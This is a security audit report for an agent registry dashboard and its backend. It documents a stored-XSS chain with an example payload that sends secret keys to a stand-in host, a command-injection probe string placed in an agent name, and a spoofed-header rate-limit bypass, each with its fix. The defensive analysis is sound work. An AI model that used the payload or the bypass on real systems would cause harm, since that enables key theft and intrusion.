# Security audit — registry, dashboard, fleet host

**Date:** 2026-08-18
**Trigger:** an agent registered on the live network on 2026-08-16 under the name
`id; echo MASTYF_PROBE_7f2a` — an automated blind command-injection probe.
**Scope:** `supabase/functions/oacp`, `supabase/functions/_shared`, `apps/dashboard`,
`apps/landing`, `agents/fleet-host`, `scripts/`.

---

## Summary

The probe itself found nothing — there is no shell path for it to reach. But looking for it
surfaced a **critical stored XSS in the dashboard that leads to theft of the owner's private keys**,
which would let an attacker decrypt every sealed end-to-end-encrypted thread that owner has. It is
reachable by anyone, unauthenticated, in one HTTP request.

| # | Severity | Finding |
|---|---|---|
| 1 | **Critical** | Stored XSS in agent detail modal → owner Ed25519 secret keys exfiltrated from `localStorage` |
| 2 | **High** | No length or content validation on any registration field |
| 3 | **Medium** | Rate-limit bypass via spoofed `X-Forwarded-For` |
| 4 | Low | Rate limiter fails open on error |
| 5 | Info | The probe: no shell interpolation path exists anywhere |

---

## 1. CRITICAL — Stored XSS → owner private-key theft

**Sinks** (`apps/dashboard/index.html`):

- **Line 2812** — `<div class="value">${langs.join(', ')}</div>`
- **Line 2807** — `[${(model.modalities || []).join(', ')}]`

Both are inside the template assigned to `agentModalBody.innerHTML` (line 2775). Neither is passed
through `esc()`.

**Source.** `langs` is `agent.metadata.languages` (line 2731); `modalities` is
`agent.metadata.model.modalities` (2729). Both come straight from the `metadata` blob on
`POST /register`, which is **unauthenticated**, has **no schema**, and has **no size limit** —
`handleRegister` (`index.ts:579`) writes `body.metadata` to the row untouched (line 652 / 693).

**The chain, end to end:**

1. Attacker registers an agent — no auth required, 10/min allowed:
   ```json
   { "name": "helpful-agent", "public_key": "<64 hex>", "capabilities": ["research"],
     "metadata": { "languages": ["<img src=x onerror='fetch(\"https://evil.example/\"+localStorage.liteneen_owner_keys)'>"] } }
   ```
2. Any dashboard user clicks that agent's card → `openAgentDetail()` → `innerHTML` → the `img`
   errors → handler runs. (Inline `<script>` would not fire via `innerHTML`; `onerror` does.)
3. The payload reads **`localStorage['liteneen_owner_keys']`** — declared at line 2050 as
   *"JSON array of hex secrets"*, the owner's Ed25519 **secret** keys.
4. Attacker now decrypts every sealed thread belonging to that owner — **past and future**, since
   these keys are long-lived and the ciphertext is retained server-side.

**Why this is the worst possible finding for this product specifically.** Slide 7 of the pitch deck
sells: *"the network sees that two agents are talking, never what they say."* This bug does not
break the registry's blindness — it steals the key from the one place that can see through it. The
guarantee that differentiates Liteneen is the guarantee this defeats, and the attacker needs
nothing but a curious click on a public dashboard.

**Fix.** Wrap both sinks:

```js
// line 2807
[${(model.modalities || []).map(esc).join(', ')}]

// line 2812
<div class="value">${langs.map(esc).join(', ')}</div>
```

**Do not stop there** — the pattern is the problem, not the two lines. Recommended, in order:

1. **Escape at the two sinks** (above) — five minutes, ships today.
2. **Validate `metadata` server-side** (finding 2) — the actual root cause.
3. **Get the secret keys out of reach of any XSS.** `localStorage` is readable by any script on the
   origin, so *any* future XSS anywhere in a 3,000-line inline-script page re-opens this. Options,
   best first:
   - Hold keys as **non-extractable `CryptoKey`s in IndexedDB** via WebCrypto, so script can use
     them but never read them. Ed25519 is supported in current browsers; this is the real fix.
   - Failing that, a **strict CSP** (`script-src 'self'`; no `'unsafe-inline'`) — which requires
     moving the inline `<script>` out to a file, worth doing anyway.
4. **Audit the other `innerHTML` sites.** 35 in the file. The agent *card* renderer (1599–1657) is
   correctly escaped throughout, and `message_type` is allowlisted server-side (`index.ts:1724`), so
   the message list is clean — but this class of bug will recur without a lint rule or a helper that
   makes escaping the default.

**One near-miss worth noting:** line 2959 interpolates `agent.name` raw into an SVG `<text>` label,
also into `innerHTML`. It is *currently* not exploitable only because line 2958 truncates the name
to 16 characters — too short for a working payload. That is an accident of formatting, not a
control. Escape it too.

---

## 2. HIGH — No validation on registration fields

`supabase/functions/_shared/validation.ts` validates:

- `public_key` — 64-char hex regex ✅
- `capabilities` — non-empty array of strings ✅
- `agent_id` — UUID regex ✅
- `name`, `description`, `owner_handle`, `metadata` — **presence only.** `validateRequired` checks
  `!== ''` and nothing else.

So every one of those is unbounded in length and unconstrained in content. Consequences beyond
finding 1:

- **Storage exhaustion.** 10 registrations/min/IP × unbounded `metadata` = a cheap way to fill the
  database. Nothing caps the request body.
- **Dashboard corruption.** A 50,000-character name breaks every list it appears in.
- **Log and alert injection.** Names flow into `console.error` output.

**Fix** — add to `validation.ts` and call from `handleRegister` (both the create and the two update
paths, lines 641–652 and 683–693):

```ts
export function validateAgentCard(body: Record<string, unknown>): ValidationError[] {
  const errors: ValidationError[] = [];
  const limits: Record<string, number> = {
    name: 100, description: 500, owner_handle: 64, endpoint_url: 300,
  };
  for (const [field, max] of Object.entries(limits)) {
    const v = body[field];
    if (v === undefined || v === null) continue;
    if (typeof v !== 'string') { errors.push({ field, message: `${field} must be a string` }); continue; }
    if (v.length > max) errors.push({ field, message: `${field} must be ${max} characters or fewer` });
    if (/[\u0000-\u001F\u007F-\u009F]/.test(v)) errors.push({ field, message: `${field} must not contain control characters` });
  }
  // name is displayed everywhere — keep it to a printable, non-markup subset
  if (typeof body.name === 'string' && /[<>]/.test(body.name)) {
    errors.push({ field: 'name', message: 'name must not contain angle brackets' });
  }
  if (body.metadata !== undefined) {
    const size = JSON.stringify(body.metadata).length;
    if (size > 16_384) errors.push({ field: 'metadata', message: 'metadata must be 16KB or smaller' });
  }
  if (Array.isArray(body.capabilities) && body.capabilities.length > 32) {
    errors.push({ field: 'capabilities', message: 'at most 32 capabilities' });
  }
  return errors;
}
```

Server-side validation is the durable fix; escaping in the dashboard is the one that stops the
bleeding today. Do both — neither substitutes for the other, because the SDKs and any third-party
client render these fields too.

---

## 3. MEDIUM — Rate-limit bypass via `X-Forwarded-For`

`index.ts:190-199`:

```ts
const forwarded = req.headers.get('x-forwarded-for');
const ip = forwarded ? forwarded.split(',')[0].trim() : 'unknown';
```

`X-Forwarded-For` accumulates left-to-right, and the platform **appends** the real client IP. Taking
`[0]` therefore takes the **client-supplied** value. An attacker sending
`X-Forwarded-For: <random>` per request gets a fresh rate-limit bucket every time — the limit is
effectively off for anyone who knows this.

This matters more than usual here because of your own comment at `index.ts:132`:

> *Blinded mailboxes are unauthenticated by design (RFC 001 §5.1), so the per-IP limit is the only
> admission control.*

For `/mailbox/deposit` and `/mailbox`, this bypass removes the *only* control.

**Fix** — take the last (platform-appended) hop rather than the first:

```ts
const parts = forwarded ? forwarded.split(',').map(s => s.trim()).filter(Boolean) : [];
const ip = parts.length ? parts[parts.length - 1] : 'unknown';
```

Verify against Supabase's actual header behaviour before shipping — if they expose a trusted client
IP directly (e.g. `cf-connecting-ip` or the connection info object), prefer that over parsing XFF at
all.

---

## 4. LOW — Rate limiter fails open

`checkRateLimit` returns `null` (allow) when the RPC errors (line 164) and on any thrown exception
(line 181). Deliberate and defensible for availability, but it means a database hiccup silently
disables all rate limiting. At minimum this should alert — the reliability sweep already has an
alerting path to reuse.

---

## 5. INFO — What the probe was actually testing, and why it failed

The name `id; echo MASTYF_PROBE_7f2a` is a blind command-injection canary: if any backend
interpolates the agent name into a shell, `id` executes and the marker appears in output the
attacker can observe.

**No such path exists.** Verified across `agents/`, `scripts/`, and `supabase/functions/`:

- The only `child_process` usage is `execFileSync` in `scripts/test-fleet-host-live.mjs` — `execFile`
  passes argv directly, no shell.
- `agents/fleet-host/index.ts:59-73` interpolates names into `path.join` for keypair files, but
  those names come from the **local hardcoded roster**, never from network data.
- No `exec(`, `execSync`, `spawn(..., {shell:true})`, or backtick-shell anywhere in the tree.

So the probe was a miss. Treat it as a signal rather than an incident: **the registry is being
scanned by automated tooling**, which means the XSS above has a realistic finder.

Registration `3757d74d-c476-4a08-9a0f-5e13f2309703` should be deleted, and its owner key
(`998456a0…`) noted.

---

## 6. HIGH — Fleet owner keys were regenerated on every deploy *(found 2026-08-19, fixed)*

Found while verifying the deploy of findings 1–3, by comparing two `GET /discover` readings eight
hours apart: **every fleet resident's `owner_public_key` had changed.** All six. The `agent_id`s and
agent public keys were identical, which rules out a seed rotation or re-registration.

**Mechanism.** `agents/fleet-host/index.ts` derived the *agent* keypair from `FLEET_MASTER_SEED`
(deterministic, survives anything) but left the *owner* keypair as a file at
`stateDir/<name>.owner.json`, with `stateDir` defaulting to `'.'`. The `render.yaml` worker declares
no `disk:`, so its filesystem is ephemeral. Every deploy or restart wiped the file, and the SDK's
`loadOrCreateKeypair` silently minted a fresh owner key.

The SDK already documents this exact hazard — `resolveKeypair` in `crypto.ts` says config/env
options exist to "pin the agent's identity on hosts with ephemeral disks (e.g. Render workers),
where a file-based keypair would be regenerated on every deploy." That escape hatch was built for
the agent key and never extended to the owner key, which has no `config.ownerKeypair` equivalent.

**Impact.** The owner key decrypts the owner slot of sealed messages (RFC 001 §3.1). Losing it means
threads sealed to the previous key are **permanently unreadable** — and the dashboard's owner-key
recovery cannot help, because the key was never backed up. `contacts.json` and `ratchets.json` were
lost on the same schedule, so pinned friendships would report `key_changed: true` to counterparties
on every routine deploy. An alarm the README calls "a loud event, never a silent migration" was
firing as background noise.

**Fix.** `deriveOwnerKeypair()` under a separate label —
`sha256(seed || "oacp-fleet-owner:" + name)` — and `pinOwnerKeypair()` writes it to the expected
path (mode `0600`) before the SDK constructor reads it, making the file a cache of the seed rather
than the source of truth. The two labels are distinct domains deliberately: the agent key travels to
the registry on every message, so the owner key must not be derivable from it.

Covered by `agents/fleet-host/src/identity.test.mjs` (7 tests, including a pin proving the agent-key
derivation is byte-identical to the pre-refactor implementation) and
`owner-key-pinning.test.mjs` (7 tests, including a reproduction of the original bug and proof the
fix closes it).

**Two things this does NOT fix:**

1. **Owner keys already lost are not recoverable.** Anything sealed to a previous boot's key stays
   unreadable, and the first deploy carrying this fix drops the current ephemeral keys too. The
   window is bounded by how much sealed traffic the fleet has handled, which is probably little —
   residents run `allowedSenders: 'open'` and mostly answer strangers in the clear — but it is not
   nothing, and it is worth confirming before assuming zero.
2. **`contacts.json` and `ratchets.json` are still ephemeral.** They hold genuine state that cannot
   be derived from a seed, so the fix for those is a Render persistent disk with `stateDir` pointed
   at it. Lower urgency while the fleet forms no friendships, but it needs doing before any resident
   holds a long-lived sealed relationship.

---

## What is already right

Worth recording, both because it's true and because it's what an investor's technical diligence
will look for:

- `message_type` is validated against an allowlist server-side (`index.ts:1724`) — the message list
  renderer is safe as a result.
- `public_key` (hex regex) and `agent_id` (UUID regex) are properly validated.
- The agent **card** renderer escapes every interpolated field, including names, handles,
  capabilities, model strings and languages.
- `endpoint_url` is stored but **never fetched** by any server code — no SSRF surface there.
- Per-route rate limits cover all 30+ endpoints (the bypass in finding 3 is the identifier, not the
  coverage).
- `deploy-secrets.local.txt` is gitignored (`.gitignore:49`) and untracked. Its contents were not
  read during this audit.
- CORS `*` is correct here — auth is bearer-token, not cookie-based, so there is no ambient-authority
  problem.
- The landing site renders no live agent data, so findings 1 and 2 do not reach it.

---

## Recommended order of work

1. **Today:** escape lines 2807, 2812, 2959; delete the probe registration.
2. **This week:** `validateAgentCard` server-side; fix the XFF parse.
3. **Before the developer launch:** move owner keys to non-extractable WebCrypto keys in IndexedDB;
   extract the dashboard's inline script and add a strict CSP; add alerting when the rate limiter
   fails open.

Item 3 is the one that turns "we fixed the bug" into "this class of bug can no longer reach the
keys" — which, given that E2E privacy is the product's central claim, is the version worth being
able to say out loud in a pitch meeting.
